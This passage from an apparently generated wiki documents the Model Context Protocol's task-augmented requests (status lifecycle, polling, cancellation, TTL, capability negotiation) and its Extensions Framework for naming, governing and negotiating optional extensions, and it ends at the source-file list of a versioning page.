- **Server as requestor**: Augments `sampling/createMessage` or `elicitation/create` requests to clients

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:20-32](), [schema/draft/schema.ts:33-47]()

## Task Augmentation Protocol

### Request Parameters

Task augmentation adds a `task` field to request parameters. The schema definition:

```typescript
// From schema/draft/schema.ts
export interface TaskAugmentedRequestParams extends RequestParams {
  task?: TaskMetadata;
}

export interface TaskMetadata {
  ttl?: number;  // Time-to-live in milliseconds
}
```

For example, augmenting a `tools/call` request:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "expensive_analysis",
    "arguments": {"dataset": "large.csv"},
    "task": {
      "ttl": 300000
    }
  }
}
```

The receiver immediately returns a `CreateTaskResult`:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "task": {
      "taskId": "786512e2-9e0d-44bd-8f29-789f320fe840",
      "status": "working",
      "createdAt": "2025-11-25T10:30:00Z",
      "lastUpdatedAt": "2025-11-25T10:30:00Z",
      "ttl": 300000,
      "pollInterval": 5000
    }
  }
}
```

**Sources:** [schema/draft/schema.ts:33-47](), [docs/specification/draft/basic/utilities/tasks.mdx:123-169](), [schema/draft/schema.json:813-829]()

### Task Object Structure

The `Task` interface from the schema:

```typescript
interface Task {
  taskId: string;                    // Unique identifier
  status: TaskStatus;                // Current state
  statusMessage?: string;            // Human-readable status
  createdAt: string;                 // ISO 8601 timestamp
  lastUpdatedAt: string;             // ISO 8601 timestamp
  ttl: number | null;                // Milliseconds or null for unlimited
  pollInterval?: number;             // Suggested polling interval in ms
}

type TaskStatus = 
  | "working"        // Task executing
  | "input_required" // Needs user/requestor input
  | "completed"      // Successfully finished
  | "failed"         // Error occurred
  | "cancelled";     // Explicitly cancelled
```

**Sources:** [schema/draft/schema.json:215-260](), [docs/specification/draft/basic/utilities/tasks.mdx:402-431]()

## Task Lifecycle Operations

### State Machine Diagram

```mermaid
stateDiagram-v2
    [*] --> working : CreateTaskResult
    
    working --> input_required : Receiver needs input
    working --> completed : Success
    working --> failed : Error
    working --> cancelled : tasks/cancel
    
    input_required --> working : Input received
    input_required --> completed : Success
    input_required --> failed : Error
    input_required --> cancelled : tasks/cancel
    
    completed --> [*]
    failed --> [*]
    cancelled --> [*]
    
    note right of completed
        Terminal states:
        Cannot transition
        to other states
    end note
    
    note right of input_required
        Receiver sends requests
        with io.modelcontextprotocol/
        related-task metadata
    end note
```

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:402-431](), [schema/draft/schema.json:215-260]()

### Polling with tasks/get

The `tasks/get` request retrieves current task status:

```mermaid
sequenceDiagram
    participant R as Requestor
    participant Recv as Receiver
    
    Note over R,Recv: Polling Loop
    
    loop Until terminal or input_required
        R->>Recv: tasks/get
        Recv->>R: Task (status: working)
        Note over R: Wait pollInterval ms
    end
    
    R->>Recv: tasks/get
    Recv->>R: Task (status: completed)
```

Request schema:

```typescript
interface GetTaskRequest extends JSONRPCRequest {
  method: "tasks/get";
  params: {
    taskId: string;
  };
}
```

Response includes full `Task` object with updated `status`, `lastUpdatedAt`, and potentially revised `ttl` or `pollInterval`.

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:184-228](), [schema/draft/schema.json:464-493]()

### Retrieving Results with tasks/result

The `tasks/result` request blocks until the task reaches a terminal state, then returns the underlying operation's result:

```mermaid
sequenceDiagram
    participant R as Requestor
    participant Recv as Receiver
    
    R->>Recv: tasks/result (taskId)
    activate Recv
    Note over Recv: Blocks until terminal
    Note over Recv: Task completes
    Recv->>R: Operation result (e.g., CallToolResult)
    deactivate Recv
```

For a `tools/call` task, the result is a `CallToolResult`:

```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "result": {
    "content": [{"type": "text", "text": "Analysis complete"}],
    "isError": false,
    "_meta": {
      "io.modelcontextprotocol/related-task": {
        "taskId": "786512e2-9e0d-44bd-8f29-789f320fe840"
      }
    }
  }
}
```

**Important:** The result matches what the underlying request would have returned directly. The `_meta` field includes the `io.modelcontextprotocol/related-task` key associating it with the task.

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:230-280](), [schema/draft/schema.json:494-511](), [docs/specification/draft/basic/utilities/tasks.mdx:463-476]()

### Task Cancellation

The `tasks/cancel` request terminates an in-progress task:

```typescript
interface CancelTaskRequest extends JSONRPCRequest {
  method: "tasks/cancel";
  params: {
    taskId: string;
  };
}
```

Response is a `CancelTaskResult` (which extends `Task`) with `status: "cancelled"`. Receivers MUST reject cancellation of already-terminal tasks with error code `-32602` (Invalid params).

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:354-386](), [schema/draft/schema.json:215-260](), [docs/specification/draft/basic/utilities/tasks.mdx:494-501]()

### Listing Tasks

The `tasks/list` operation returns paginated task lists:

```typescript
interface ListTasksRequest extends PaginatedRequest {
  method: "tasks/list";
  params?: {
    cursor?: Cursor;
  };
}

interface ListTasksResult extends PaginatedResult {
  tasks: Task[];
  nextCursor?: Cursor;
}
```

All tasks retrievable via `tasks/get` MUST also appear in `tasks/list` results for that requestor.

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:308-351](), [schema/draft/schema.json:473-500](), [docs/specification/draft/basic/utilities/tasks.mdx:487-493]()

## Capability Negotiation

### Server Capabilities

Servers declare task support in their `ServerCapabilities` during initialization:

```typescript
interface ServerCapabilities {
  tasks?: {
    list?: object;           // Supports tasks/list
    cancel?: object;         // Supports tasks/cancel
    requests?: {
      tools?: {
        call?: object;       // Supports task-augmented tools/call
      };
    };
  };
}
```

Example declaration:

```json
{
  "capabilities": {
    "tasks": {
      "list": {},
      "cancel": {},
      "requests": {
        "tools": {
          "call": {}
        }
      }
    }
  }
}
```

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:36-63](), [schema/draft/schema.ts:429-455]()

### Client Capabilities

Clients declare task support similarly:

```typescript
interface ClientCapabilities {
  tasks?: {
    list?: object;
    cancel?: object;
    requests?: {
      sampling?: {
        createMessage?: object;  // Supports task-augmented sampling
      };
      elicitation?: {
        create?: object;         // Supports task-augmented elicitation
      };
    };
  };
}
```

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:65-93](), [schema/draft/schema.ts:342-377]()

### Tool-Level Negotiation

Individual tools can specify task support via `execution.taskSupport`:

| Value | Meaning |
|-------|---------|
| `"forbidden"` or absent | Tool MUST NOT be invoked as task |
| `"optional"` | Tool MAY be invoked as task or normally |
| `"required"` | Tool MUST be invoked as task |

Example tool declaration:

```json
{
  "name": "long_running_analysis",
  "execution": {
    "taskSupport": "required"
  }
}
```

Clients MUST return error `-32601` (Method not found) if attempting task invocation when forbidden, or not using tasks when required.

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:109-120]()

## Task Status Notifications

Receivers MAY send `notifications/tasks/status` when task status changes:

```typescript
interface TaskStatusNotification extends JSONRPCNotification {
  method: "notifications/tasks/status";
  params: Task;  // Full task object with updated status
}
```

Example notification:

```json
{
  "jsonrpc": "2.0",
  "method": "notifications/tasks/status",
  "params": {
    "taskId": "786512e2-9e0d-44bd-8f29-789f320fe840",
    "status": "completed",
    "createdAt": "2025-11-25T10:30:00Z",
    "lastUpdatedAt": "2025-11-25T10:50:00Z",
    "ttl": 60000
  }
}
```

**Important:** Requestors MUST NOT rely on receiving these notifications. They are optional and receivers may choose not to send them. Requestors SHOULD continue polling via `tasks/get`.

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:283-306](), [docs/specification/draft/basic/utilities/tasks.mdx:477-482]()

## Input Required Status

### Workflow

When a task transitions to `input_required`, the receiver needs additional information from the requestor to continue:

```mermaid
sequenceDiagram
    participant R as Requestor
    participant Recv as Receiver
    
    Note over R,Recv: Task executing
    
    R->>Recv: tasks/get
    Recv->>R: Task (status: input_required)
    
    Note over R: Recognize input needed
    R->>Recv: tasks/result
    activate Recv
    
    Recv->>R: sampling/createMessage or elicitation/create
    Note over Recv: Request includes<br/>_meta.io.modelcontextprotocol/related-task
    
    R->>Recv: Result (approved by user)
    
    Note over Recv: Process input<br/>Continue execution<br/>Task -> working
    
    Recv->>R: Final result
    deactivate Recv
```

The receiver MUST include `io.modelcontextprotocol/related-task` metadata in the request it sends:

```json
{
  "jsonrpc": "2.0",
  "id": 10,
  "method": "sampling/createMessage",
  "params": {
    "_meta": {
      "io.modelcontextprotocol/related-task": {
        "taskId": "786512e2-9e0d-44bd-8f29-789f320fe840"
      }
    },
    "messages": [...]
  }
}
```

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:434-453](), [docs/specification/draft/basic/utilities/tasks.mdx:470-476]()

## TTL and Resource Management

### Time-To-Live Semantics

| Field | Type | Description |
|-------|------|-------------|
| `ttl` | `number \| null` | Milliseconds until task expires, or `null` for unlimited |
| `createdAt` | `string` | ISO 8601 timestamp when task was created |
| `lastUpdatedAt` | `string` | ISO 8601 timestamp of last status change |
| `pollInterval` | `number` (optional) | Suggested polling interval in milliseconds |

Behavior requirements:
- Requestors MAY suggest a `ttl` in the initial request
- Receivers MAY override the requested `ttl`
- Receivers MUST include actual `ttl` in responses
- After `ttl` expires, receivers MAY delete task and results regardless of status
- Receivers SHOULD NOT upgrade to SSE streams for `tasks/get` (use for `tasks/result` if needed)

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:454-462](), [docs/specification/draft/basic/utilities/tasks.mdx:186-195](), [docs/specification/draft/basic/utilities/tasks.mdx:232-245]()

## Integration with MCP Features

### Task-Augmented Tool Calls

```mermaid
graph LR
    subgraph "Normal Tool Call"
        C1["Client"] -->|"tools/call"| S1["Server"]
        S1 -->|"CallToolResult (blocking)"| C1
    end
    
    subgraph "Task-Augmented Tool Call"
        C2["Client"] -->|"tools/call + task"| S2["Server"]
        S2 -->|"CreateTaskResult (immediate)"| C2
        C2 -->|"tasks/get (poll)"| S2
        S2 -->|"Task status"| C2
        C2 -->|"tasks/result"| S2
        S2 -->|"CallToolResult"| C2
    end
```

The server capability `tasks.requests.tools.call` enables this. The `CallToolRequestParams` interface includes the optional `task` field:

```typescript
interface CallToolRequestParams extends TaskAugmentedRequestParams {
  name: string;
  arguments?: { [key: string]: unknown };
  task?: TaskMetadata;  // Inherited from TaskAugmentedRequestParams
}
```

**Sources:** [schema/draft/schema.ts:1131-1144](), [docs/specification/draft/basic/utilities/tasks.mdx:42-48]()

### Task-Augmented Sampling

Servers can request task-augmented LLM sampling from clients:

```typescript
interface CreateMessageRequestParams {
  messages: SamplingMessage[];
  maxTokens: number;
  task?: TaskMetadata;
  // ... other fields
}
```

This requires client capability `tasks.requests.sampling.createMessage`. Useful for long-running agentic loops where the server needs to implement complex multi-step reasoning.

**Sources:** [schema/draft/schema.ts:683-760](), [docs/specification/draft/basic/utilities/tasks.mdx:69-75]()

### Task-Augmented Elicitation

Similarly, elicitation requests can be task-augmented:

```typescript
interface ElicitRequestParams {
  mode: "form" | "url";
  message: string;
  task?: TaskMetadata;
  // ... mode-specific fields
}
```

Requires client capability `tasks.requests.elicitation.create`.

**Sources:** [schema/draft/schema.json:860-865](), [docs/specification/draft/basic/utilities/tasks.mdx:69-75]()

## Implementation Requirements

### Task ID Management

- Task IDs MUST be strings
- Task IDs MUST be unique among all tasks controlled by the receiver
- Task IDs MUST be generated by the receiver upon task creation
- For `tasks/get`, `tasks/result`, `tasks/cancel`: the `taskId` parameter is the source of truth (receivers MUST ignore `_meta` field)

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:396-402](), [docs/specification/draft/basic/utilities/tasks.mdx:470-476]()

### State Transition Rules

Valid transitions:
- From `working`: → `input_required`, `completed`, `failed`, `cancelled`
- From `input_required`: → `working`, `completed`, `failed`, `cancelled`
- Terminal states (`completed`, `failed`, `cancelled`): MUST NOT transition

Receivers MUST enforce these transitions. Invalid transitions should result in protocol errors.

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:402-431]()

### Result Behavior

When `tasks/result` is called:
- For non-terminal tasks: MUST block until terminal state reached
- For terminal tasks: MUST return immediately with the result
- The result MUST match what the underlying request would have returned (same structure, error codes, etc.)
- For failed tasks: return as JSON-RPC error response
- MUST include `io.modelcontextprotocol/related-task` metadata in result

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:463-469]()

### Error Handling

| Error Code | Scenario |
|------------|----------|
| `-32601` | Method not found - tool requires task augmentation but not used, or vice versa |
| `-32602` | Invalid params - attempting to cancel already-terminal task |

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:109-120](), [docs/specification/draft/basic/utilities/tasks.mdx:494-497]()

## Progress Notifications

Task-augmented requests support standard MCP progress notifications. The `progressToken` from the initial request remains valid throughout the task lifetime:

```json
{
  "jsonrpc": "2.0",
  "method": "notifications/progress",
  "params": {
    "progressToken": "token123",
    "progress": 50,
    "total": 100,
    "message": "Processing dataset..."
  }
}
```

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:483-486]()

## Message Flow Examples

### Complete Task Lifecycle

```mermaid
sequenceDiagram
    participant C as Client (Requestor)
    participant S as Server (Receiver)
    
    Note over C,S: 1. Task Creation
    C->>S: tools/call (task={ttl:60000})
    S->>C: CreateTaskResult (taskId, status:working, pollInterval:5000)
    
    Note over C,S: 2. Polling Phase
    loop Every 5 seconds
        C->>S: tasks/get(taskId)
        S->>C: Task (status:working)
    end
    
    Note over S: Task completes
    
    C->>S: tasks/get(taskId)
    S->>C: Task (status:completed)
    
    Note over C,S: 3. Result Retrieval
    C->>S: tasks/result(taskId)
    S->>C: CallToolResult with _meta.related-task
```

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:502-595]()

### Input Required Flow

```mermaid
sequenceDiagram
    participant C as Client
    participant S as Server
    participant User
    
    C->>S: tools/call (task={})
    S->>C: CreateTaskResult (status:working)
    
    Note over S: Needs user decision
    
    C->>S: tasks/get
    S->>C: Task (status:input_required)
    
    C->>S: tasks/result (blocking)
    activate S
    
    S->>C: elicitation/create (_meta.related-task)
    Note over C,User: User provides input
    C->>S: ElicitResult
    
    Note over S: Process input<br/>Complete work
    
    S->>C: CallToolResult (final)
    deactivate S
```

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:596-674]()

## Schema Type Reference

Key types from the schema:

| Type | File Location | Purpose |
|------|---------------|---------|
| `TaskMetadata` | [schema/draft/schema.ts:46]() | Request augmentation parameters |
| `TaskAugmentedRequestParams` | [schema/draft/schema.ts:37-47]() | Base interface for task requests |
| `Task` | [schema/draft/schema.json:215-260]() | Task state object |
| `CreateTaskResult` | [schema/draft/schema.json:813-829]() | Immediate response to task-augmented request |
| `GetTaskRequest` | [schema/draft/schema.json:464-493]() | Status polling request |
| `GetTaskPayloadRequest` | [schema/draft/schema.json:512-539]() | Result retrieval request (blocking) |
| `CancelTaskRequest` | [schema/draft/schema.json:215-249]() | Cancellation request |
| `ListTasksRequest` | [schema/draft/schema.json:473-500]() | List tasks with pagination |
| `TaskStatusNotification` | [schema/draft/schema.json:421-426]() | Status change notification |

**Sources:** [schema/draft/schema.ts:1-50](), [schema/draft/schema.json:1-100]()

---

# Page: Extensions Framework

# Extensions Framework

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/CODEOWNERS](.github/CODEOWNERS)
- [docs/community/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.mdx](docs/community/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.mdx)
- [docs/community/seps/2133-extensions.mdx](docs/community/seps/2133-extensions.mdx)
- [docs/community/seps/index.mdx](docs/community/seps/index.mdx)
- [docs/docs.json](docs/docs.json)
- [docs/docs/tutorials/security/security_best_practices.mdx](docs/docs/tutorials/security/security_best_practices.mdx)
- [docs/images/quickstart-apps/add-custom-connector.gif](docs/images/quickstart-apps/add-custom-connector.gif)
- [docs/images/quickstart-apps/create-mcp-app-skill.gif](docs/images/quickstart-apps/create-mcp-app-skill.gif)
- [docs/images/quickstart-apps/test-color-picker.gif](docs/images/quickstart-apps/test-color-picker.gif)
- [docs/specification/draft/basic/utilities/tasks.mdx](docs/specification/draft/basic/utilities/tasks.mdx)
- [docs/specification/draft/client/elicitation.mdx](docs/specification/draft/client/elicitation.mdx)
- [docs/specification/draft/client/sampling.mdx](docs/specification/draft/client/sampling.mdx)
- [docs/specification/draft/schema.mdx](docs/specification/draft/schema.mdx)
- [schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json](schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json)
- [schema/draft/examples/ServerCapabilities/extensions-ui.json](schema/draft/examples/ServerCapabilities/extensions-ui.json)
- [schema/draft/schema.json](schema/draft/schema.json)
- [schema/draft/schema.ts](schema/draft/schema.ts)
- [seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.md](seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.md)
- [seps/2133-extensions.md](seps/2133-extensions.md)

</details>



## Purpose and Scope

This page documents the Extensions Framework for the Model Context Protocol (MCP), which provides a standardized mechanism for extending MCP with optional, composable capabilities beyond the core protocol. The framework defines how extensions are identified, governed, implemented, and negotiated between clients and servers.

The Extensions Framework enables the MCP ecosystem to evolve while maintaining core protocol stability. It establishes clear processes for both official extensions (maintained by MCP maintainers) and experimental extensions (incubation pathways for community collaboration).

For information about the core protocol specification, see [Protocol Specification](#2). For details about specific authorization extensions, see [Authorization and Security](#3). For information about MCP Apps (an official extension), see the [MCP Apps documentation](https://github.com/modelcontextprotocol/ext-apps).

## Extension Identification and Naming

Extensions are identified using a unique extension identifier with the format `{vendor-prefix}/{extension-name}`. The vendor prefix should be a reversed domain name that the extension author owns or controls, following Java package naming conventions. For example:

- `io.modelcontextprotocol/oauth-client-credentials` (official MCP extension)
- `com.example/websocket-transport` (third-party extension)

Extension identifiers follow the same naming rules as `_meta` keys [schema/draft/schema.ts:20-34](), with the requirement that the prefix is mandatory. Breaking changes must use a new identifier (e.g., `io.modelcontextprotocol/oauth-client-credentials-v2`), where a breaking change is defined as any modification that would cause existing compliant implementations to fail or behave incorrectly.

Sources: [seps/2133-extensions.md:20-30]()

## Extension Types

The Extensions Framework defines three categories of extensions:

### Official Extensions

Official extensions are maintained within the MCP GitHub organization and are officially developed and recommended by MCP maintainers. They use the `io.modelcontextprotocol` vendor prefix.

**Extension Repository Structure:**
- Located at `https://github.com/modelcontextprotocol/ext-{category}` (e.g., `ext-auth`, `ext-apps`)
- Created at core maintainers' discretion to group extensions by area
- Each repository has a `MAINTAINERS.md` file identifying repository maintainers
- Maintainers are appointed by core maintainers and responsible for day-to-day governance
- Extensions should have an associated working group or interest group

**Extension Specifications:**
- Versioned specification documents within extension repositories
- Must use the same language as the core specification (RFC 2119 / BCP 14)
- Should be worded as if they were part of the core specification

Core maintainers retain ultimate authority over official extensions, including the ability to modify, deprecate, or remove any extension.

### Experimental Extensions

Experimental extensions provide an incubation pathway for Working Groups and Interest Groups to prototype ideas and collaborate before formal SEP submission. They allow cross-company collaboration under neutral governance with clear anti-trust protection.

**Experimental Repository Structure:**
- Located at `https://github.com/modelcontextprotocol/experimental-ext-{name}`
- Any maintainer may create an experimental extension repository while the associated SEP is in draft state
- Must be associated with a Working Group or Interest Group
- Must clearly indicate experimental/non-official status in README
- Published packages must use naming that clearly indicates experimental status
- Core maintainers retain oversight and can archive or remove repositories

**Graduation Path:**
- To graduate to official status, the standard SEP process (Extensions Track) applies
- The experimental repository and reference implementations may be referenced in the SEP
- Once approved, the extension moves to an official extension repository

### Unofficial Extensions

Unofficial extensions are not recognized by MCP governance and may be introduced and governed by developers outside the MCP organization. They use vendor prefixes other than `io.modelcontextprotocol`.

Sources: [seps/2133-extensions.md:36-64]()

## Extension Capability Negotiation

Extensions are negotiated during the MCP initialization handshake through the `extensions` field in client and server capabilities. Both `ClientCapabilities` and `ServerCapabilities` include an optional `extensions` object [schema/draft/schema.ts:559-566]() and [schema/draft/schema.ts:675-683]().

### Capability Declaration

Extensions are declared as a map where keys are extension identifiers and values are per-extension settings objects:

```json
{
  "capabilities": {
    "extensions": {
      "io.modelcontextprotocol/apps": {
        "mimeTypes": ["text/html;profile=mcp-app"]
      },
      "io.modelcontextprotocol/oauth-client-credentials": {}
    }
  }
}
```

An empty object indicates support with no settings. Clients and servers must only use extensions that have been declared by both parties.

### Extension Settings

Extensions may have settings that are sent in client/server messages for fine-grained configuration. For example, the MCP Apps extension includes `mimeTypes` to specify supported MIME types [schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json]().

Sources: [schema/draft/schema.ts:559-566](), [schema/draft/schema.ts:675-683](), [schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json](), [schema/draft/examples/ServerCapabilities/extensions-ui.json]()

## Official Extensions

### MCP Apps Extension

The MCP Apps extension (`io.modelcontextprotocol/apps`) enables servers to deliver interactive user interfaces to hosts. This extension introduces:

- **UI Resources**: Predeclared resources using the `ui://` URI scheme
- **Resource Discovery**: Tools reference UI resources via metadata
- **Bi-directional Communication**: UI iframes communicate with hosts using standard MCP JSON-RPC protocol
- **Security Model**: Mandatory iframe sandboxing with auditable communication

The initial specification focuses on HTML content (`text/html;profile=mcp-app`) with extensibility for future formats. Full specification is maintained in the [ext-apps repository](https://github.com/modelcontextprotocol/ext-apps).

### Authorization Extensions

Authorization extensions extend MCP's OAuth 2.1-based authorization system with additional capabilities:

- **OAuth Client Credentials** (`io.modelcontextprotocol/oauth-client-credentials`): Supports machine-to-machine authorization flows
- **Enterprise Managed Authorization** (`io.modelcontextprotocol/enterprise-managed-authorization`): Enables enterprise IdP policy controls during MCP OAuth flows

These extensions are maintained in the [ext-auth repository](https://github.com/modelcontextprotocol/ext-auth).

Sources: [seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.md:18-82](), [docs/community/seps/2133-extensions.mdx:55-67]()

## Extension Lifecycle

### Creation Phase

Extensions may optionally begin as experimental extensions to facilitate prototyping and collaboration before formal submission. This incubation period is encouraged but not required.

To become an official extension, extensions are created via a SEP in the main MCP repository using the standard SEP guidelines with a new type: **Extensions Track**. This type follows the same review and acceptance process as Standards Track SEPs but clearly indicates the proposal is for an extension rather than a core protocol addition.

**Extension SEP Requirements:**
- Should be discussed and iterated on in a relevant working group prior to submission
- Must have at least one reference implementation in an official SDK prior to review
- May reference an existing experimental extension repository and implementations developed during incubation
- Will be reviewed by Core Maintainers, who have final authority over inclusion as an Official Extension

### Implementation Phase

Once approved, the extension author should produce a PR that:
1. Introduces the extension to the appropriate extension repository
2. Adds reference in the main specification
3. Includes reference implementations in official SDKs

### Maintenance Phase

Day-to-day governance is delegated to extension repository maintainers, but core maintainers retain ultimate authority over official extensions.

Sources: [seps/2133-extensions.md:66-80]()

## Extension Framework Architecture

The following diagram illustrates how extensions fit into the MCP protocol architecture and how they are negotiated:

```mermaid
graph TB
    subgraph "Initialization Phase"
        CLIENT["Client<br/>ClientCapabilities<br/>extensions: {...}"]
        SERVER["Server<br/>ServerCapabilities<br/>extensions: {...}"]
        INIT["initialize request/response"]
    end
    
    subgraph "Extension Negotiation"
        MATCH["Capability Matching<br/>Both parties declare<br/>same extension ID"]
        ENABLED["Extension Enabled<br/>Both parties support<br/>extension"]
        DISABLED["Extension Disabled<br/>One or both parties<br/>don't support"]
    end
    
    subgraph "Runtime Communication"
        CORE["Core Protocol<br/>JSON-RPC Messages"]
        EXT_MSG["Extension Messages<br/>Using extension-specific<br/>request/response types"]
    end
    
    CLIENT -->|sends| INIT
    SERVER -->|receives| INIT
    INIT --> MATCH
    MATCH -->|match found| ENABLED
    MATCH -->|no match| DISABLED
    ENABLED --> EXT_MSG
    DISABLED --> CORE
    EXT_MSG --> CORE
```

Sources: [schema/draft/schema.ts:559-566](), [schema/draft/schema.ts:675-683]()

## Extension Message Flow

The following diagram shows how extension-specific messages are processed within the MCP protocol:

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Note over Client,Server: Initialization
    Client->>Server: initialize (with extensions capability)
    Server->>Client: initialize result (with extensions capability)
    
    Note over Client,Server: Extension Negotiation
    rect
        Note right of Client: Check if extension<br/>is supported by server
        Note right of Server: Check if extension<br/>is supported by client
    end
    
    alt Extension Supported by Both
        Note over Client,Server: Extension Enabled
        Client->>Server: extension-specific request
        Server->>Client: extension-specific response
    else Extension Not Supported
        Note over Client,Server: Use Core Protocol
        Client->>Server: standard MCP request
        Server->>Client: standard MCP response
    end
```

Sources: [schema/draft/schema.ts:387-436]()

## Extension Settings and Configuration

Extensions may include settings that are sent in client/server messages for fine-grained configuration. Settings are passed as values in the `extensions` capability object during initialization.

### Example: MCP Apps MIME Type Configuration

The MCP Apps extension allows clients to declare supported MIME types:

```json
{
  "capabilities": {
    "extensions": {
      "io.modelcontextprotocol/apps": {
        "mimeTypes": ["text/html;profile=mcp-app", "text/html"]
      }
    }
  }
}
```

Servers can then use this information to determine which content types to use when delivering UI resources.

### Example: Empty Settings

Extensions that don't require configuration use an empty object:

```json
{
  "capabilities": {
    "extensions": {
      "io.modelcontextprotocol/oauth-client-credentials": {}
    }
  }
}
```

Sources: [schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json](), [schema/draft/examples/ServerCapabilities/extensions-ui.json]()

## Extension Governance and SEP Process

Extensions are governed through the Specification Enhancement Proposal (SEP) process. SEP-2133 established the Extensions Framework itself, and subsequent extensions follow the Extensions Track type within the SEP process.

### SEP-2133: Extensions Framework

SEP-2133 (Final status) established the lightweight framework for extending MCP through optional, composable extensions. It defines:

- Extension identification and naming conventions
- Official vs. experimental vs. unofficial extension categories
- Governance model and authority structure
- Lifecycle from creation through maintenance
- Capability negotiation mechanism

### Extensions Track SEPs

Extensions Track SEPs follow the same review and acceptance process as Standards Track SEPs but are specifically for extension proposals. Recent Extensions Track SEPs include:

- **SEP-1865**: MCP Apps - Interactive User Interfaces for MCP (Final)

Sources: [seps/2133-extensions.md](), [docs/community/seps/2133-extensions.mdx](), [docs/community/seps/index.mdx:21]()

## Extension Implementation Patterns

### Declaring Extension Support

Implementations declare extension support in their capabilities during initialization:

**Server declaring MCP Apps support:**
```json
{
  "capabilities": {
    "extensions": {
      "io.modelcontextprotocol/apps": {}
    }
  }
}
```

**Client declaring MCP Apps support with MIME types:**
```json
{
  "capabilities": {
    "extensions": {
      "io.modelcontextprotocol/apps": {
        "mimeTypes": ["text/html;profile=mcp-app"]
      }
    }
  }
}
```

### Checking Extension Support

After initialization, implementations should check if both parties support an extension before using extension-specific features:

1. Check if extension ID exists in peer's `capabilities.extensions`
2. If present, extension is supported
3. If absent, extension is not supported; use core protocol only
4. If extension has settings, use those settings to configure behavior

### Handling Unsupported Extensions

If an implementation receives a request for an unsupported extension, it should:

1. Return a `METHOD_NOT_FOUND` error (code -32601) if the request method is extension-specific
2. Fall back to core protocol behavior if applicable
3. Never assume an extension is supported without explicit capability declaration

Sources: [schema/draft/schema.ts:559-566](), [schema/draft/schema.ts:675-683]()

## Extension Repository Structure

Official extension repositories follow a standardized structure:

```
ext-{category}/
├── MAINTAINERS.md              # Repository maintainers
├── specification/
│   ├── draft/
│   │   └── {extension-name}.mdx # Extension specification
│   └── {version}/
│       └── {extension-name}.mdx # Versioned specification
├── README.md                    # Repository overview
└── {language}-sdk/              # Reference implementations
    ├── src/
    └── tests/
```

**Key Files:**

- `MAINTAINERS.md`: Lists maintainers appointed by core maintainers
- `specification/draft/{extension-name}.mdx`: Current extension specification
- Reference implementations in official SDKs (TypeScript, Python, Java, etc.)

Experimental extension repositories use the `experimental-ext-` prefix and must clearly indicate their non-official status.

Sources: [seps/2133-extensions.md:36-50]()

## Extension Versioning and Breaking Changes

Extensions use semantic versioning principles. Breaking changes require a new extension identifier:

- **Non-breaking changes**: Can be made within the same extension identifier
- **Breaking changes**: Require a new identifier (e.g., `io.modelcontextprotocol/oauth-client-credentials-v2`)

**Breaking Change Definition:**
- Removing or renaming fields
- Changing field types
- Altering the semantics of existing behavior
- Adding new required fields

This approach ensures backward compatibility and allows implementations to support multiple versions of an extension simultaneously.

Sources: [seps/2133-extensions.md:30]()

## Extension Discovery and Documentation

Extensions are documented in the main MCP specification and in extension-specific repositories. The documentation site includes:

- **Extensions Overview**: High-level introduction to the Extensions Framework
- **Official Extensions**: Documentation for each official extension
- **Extension Repositories**: Links to GitHub repositories for each extension

The MCP Registry may also include information about extensions supported by registered servers.

Sources: [docs/docs.json:69-88]()

---

# Page: Protocol Versioning and Changelog

# Protocol Versioning

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.gitattributes](.gitattributes)
- [.prettierignore](.prettierignore)
- [docs/specification/2025-06-18/basic/index.mdx](docs/specification/2025-06-18/basic/index.mdx)
- [docs/specification/2025-06-18/basic/transports.mdx](docs/specification/2025-06-18/basic/transports.mdx)
- [docs/specification/2025-06-18/basic/utilities/cancellation.mdx](docs/specification/2025-06-18/basic/utilities/cancellation.mdx)
- [docs/specification/2025-06-18/basic/utilities/ping.mdx](docs/specification/2025-06-18/basic/utilities/ping.mdx)
- [docs/specification/2025-06-18/schema.mdx](docs/specification/2025-06-18/schema.mdx)
- [docs/specification/2025-11-25/schema.mdx](docs/specification/2025-11-25/schema.mdx)
- [docs/specification/draft/basic/transports.mdx](docs/specification/draft/basic/transports.mdx)
- [docs/specification/draft/basic/utilities/cancellation.mdx](docs/specification/draft/basic/utilities/cancellation.mdx)
- [docs/specification/draft/basic/utilities/ping.mdx](docs/specification/draft/basic/utilities/ping.mdx)
- [docs/specification/draft/changelog.mdx](docs/specification/draft/changelog.mdx)
- [docs/style.css](docs/style.css)
- [schema/2025-06-18/schema.mdx](schema/2025-06-18/schema.mdx)
- [schema/2025-06-18/schema.ts](schema/2025-06-18/schema.ts)
- [schema/2025-11-25/schema.ts](schema/2025-11-25/schema.ts)
